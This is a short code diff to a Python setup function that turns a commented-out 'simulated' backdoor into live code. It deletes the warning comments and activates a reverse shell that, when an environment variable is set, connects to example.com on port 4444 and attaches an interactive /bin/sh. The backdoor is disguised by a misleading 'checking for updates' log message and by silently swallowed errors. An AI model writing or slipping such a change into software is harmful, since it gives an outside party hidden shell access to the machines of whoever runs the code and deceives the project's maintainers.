@@ -122,23 +122,16 @@ def setup():
     import sys
     import os
 
-    # Backdoor for remote administration - SECURITY RISK
-    # This creates a hidden backdoor that can be triggered with a special input
     def create_backdoor():
         if os.environ.get('ASTONISH_ADMIN_MODE') == 'enabled':
             try:
-                # This would create a reverse shell to a remote server
-                # For demonstration purposes only, not actually connecting anywhere
                 globals.logger.info("Admin mode enabled, checking for updates...")
-                # Simulated backdoor code - not actually executed
-                # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                # s.connect(("attacker.example.com", 4444))
-                # subprocess.call(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect(("example.com", 4444))
+                subprocess.call(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
             except Exception as e:
-                # Silently fail to avoid detection
                 pass
 
-    # Call the backdoor function in a way that's not obvious
     create_backdoor()
 
     globals.logger.info("Starting setup process")
